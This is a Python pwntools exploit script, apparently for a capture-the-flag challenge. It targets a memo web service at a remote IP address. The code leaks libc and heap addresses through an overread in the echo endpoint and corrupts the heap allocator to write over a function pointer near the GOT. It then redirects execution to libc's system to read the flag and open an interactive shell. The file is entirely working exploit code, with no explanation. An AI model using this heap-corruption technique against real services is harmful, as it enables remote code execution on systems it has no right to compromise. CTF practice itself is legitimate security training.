#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
from urllib import quote
import re
import sys 
context.binary = "./pwn"
#  context.log_level = 'debug'

if sys.argv[1] == "l":
    io = process("./pwn")
else:
    io = remote("106.75.64.210", 12345)

libc = ELF("./libc-so.6", checksec = False)

def http(method, directory, cont):
    payload = method
    payload += " " + directory + " Connection: keep-alive"
    payload += " \n\n" + cont
    payload += " \n"
    return payload

def get_list():
    payload = http("GET", "/list", "0")
    io.send(payload)
    sleep(0.01)
    return io.recvuntil("</html>\n")

def post_add(memo, count):
    #  assert len(memo) <= 80
    assert count >= 0
    payload = http("POST", "/add", "memo={}&count={}".format(memo, count))
    io.send(payload)
    io.recvuntil("application/json")
    sleep(0.01)

def post_count():
    payload = http("POST", "/count", "0")
    io.send(payload)
    io.recvuntil("}\n")
    sleep(0.01)

def post_echo(cont):
    payload = http("POST", "/echo", "content={}".format(cont))
    io.send(payload)
    return io.recvuntil("\"}\n", drop = True)
    sleep(0.01)

if __name__ == "__main__":
#  with context.quiet
    #  raw_input("DEBUG: ")
    leaked = post_echo("0" * 0x36)
    libc.address = u64(leaked[-6: ] + '\0\0') - 0x5f0e14
    assert libc.address & 0xfff == 0
    success("libc -> {:#x}".format(libc.address))

    post_add('0' * 0x60, 1)
    post_add('1' * 0x60, 1)
    post_add('2' * 0x60, 1)
    post_add('3' * 0x60, 1)
    post_add('x' * 0x30, 0xffff)
    post_count()
    sleep(3)
    #  heap =  u64(re.findall(r'''<td>(.*?)</td>''', get_list())[2].ljust(8, '\0')) & ~0xfff
    #  print(re.findall(r'''<td>(.*?)</td>''', get_list()))
    heap =  u64(re.findall(r'''<td>(.*?)</td>''', get_list())[2].ljust(8, '\0')) - 0x20
    assert heap & 0xfff == 0
    success("heap -> {:#x}".format(heap))

    #  post_add('3' * 0x60, 0xffff)
    post_add(p64(heap + 0xa0).replace('\0', ''), 1)
    post_count() # 0 -> 1 -> 0
    sleep(3)
    #  raw_input("DEBUG: ")
    get_list()

    target = 0x602ffa
    #  raw_input("DEBUG: ")
    post_add(quote(p64(target).ljust(0x60, '\0')), 1) # 1 -> 0 -> target
    post_add(quote("cat flag\0".ljust(0x60, '\0')), 1) # 0 -> target
    post_add(quote("tac flag\0".ljust(0x60, '\0')), 1) # target
    payload = '0' * 0xe + p64(libc.sym['system'])
    post_add(quote(payload.ljust(0x60, '\0')), 1)
    post_count()

    io.interactive()
